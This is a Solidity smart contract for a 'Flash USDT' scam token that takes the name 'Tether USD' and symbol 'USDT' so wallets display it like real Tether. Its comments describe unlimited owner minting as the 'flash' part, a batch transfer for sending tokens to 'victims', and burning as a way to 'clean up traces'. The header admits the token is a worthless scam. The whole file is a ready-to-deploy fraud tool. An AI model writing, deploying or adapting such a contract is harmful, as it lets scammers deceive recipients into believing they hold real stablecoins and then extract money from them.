// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Fake USDT Flash Token - name "Tether USD" / symbol "USDT" so wallets render it
// identically to real Tether. WARNING: scam token, $0 value, not real USDT.
contract FlashUSDT {
    string public name = "Tether USD";
    string public symbol = "USDT";
    uint8 public decimals = 18;
    uint256 public totalSupply;
    address public owner;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    // Owner can mint unlimited (the "flash" part)
    function mint(address to, uint256 amount) public onlyOwner {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    // Burn (owner or self) - useful to clean up traces
    function burn(address from, uint256 amount) public {
        require(msg.sender == owner || msg.sender == from, "no auth");
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }

    // Batch transfer to many victims in one tx (gas efficient)
    function batchTransfer(address[] calldata to, uint256[] calldata amounts) public {
        require(to.length == amounts.length, "len");
        for (uint256 i = 0; i < to.length; i++) {
            require(balanceOf[msg.sender] >= amounts[i], "bal");
            balanceOf[msg.sender] -= amounts[i];
            balanceOf[to[i]] += amounts[i];
            emit Transfer(msg.sender, to[i], amounts[i]);
        }
    }

    function transfer(address to, uint256 value) public returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        require(balanceOf[from] >= value, "bal");
        require(allowance[from][msg.sender] >= value, "allow");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}
